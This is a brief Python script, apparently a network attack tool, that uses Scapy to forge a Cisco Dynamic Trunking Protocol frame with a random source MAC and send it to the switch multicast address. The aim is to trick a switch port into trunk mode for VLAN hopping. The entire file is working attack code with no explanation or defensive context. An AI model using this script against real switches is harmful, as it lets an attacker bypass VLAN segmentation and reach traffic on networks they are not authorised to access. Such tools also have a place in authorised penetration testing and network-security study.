import sys
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR) 
from scapy.all import *
load_contrib('dtp')
random_mac = str(RandMAC())
trunk_negotiage = Dot3(src=random_mac, dst="01:00:0c:cc:cc:cc")/ \
                  LLC()/SNAP()/ \
                  DTP(tlvlist=[DTPDomain(),DTPStatus(),DTPType(),DTPNeighbor(neighbor=random_mac)])
sendp(trunk_negotiage)